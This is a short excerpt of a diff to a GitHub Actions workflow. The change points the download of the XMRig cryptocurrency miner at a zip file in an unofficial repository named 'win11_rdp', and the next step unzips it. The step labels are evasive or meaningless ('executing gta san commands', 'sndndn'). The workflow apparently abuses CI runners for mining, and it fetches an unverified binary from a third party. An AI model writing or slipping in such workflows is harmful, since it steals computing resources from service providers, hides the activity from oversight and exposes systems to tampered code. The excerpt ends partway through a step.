@@ -10,7 +10,7 @@ jobs:
 
     steps:
     - name: downloading xm
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip
+      run: Invoke-WebRequest https://github.com/Ma24wt/win11_rdp/blob/main/xmrig-6.17.0-gcc-win64.zip?raw=true -OutFile xmrig-6.17.0-gcc-win64.zip
     - name: executing gta san commands
       run: unzip xmrig-6.17.0-gcc-win64.zip
     - name : sndndn 
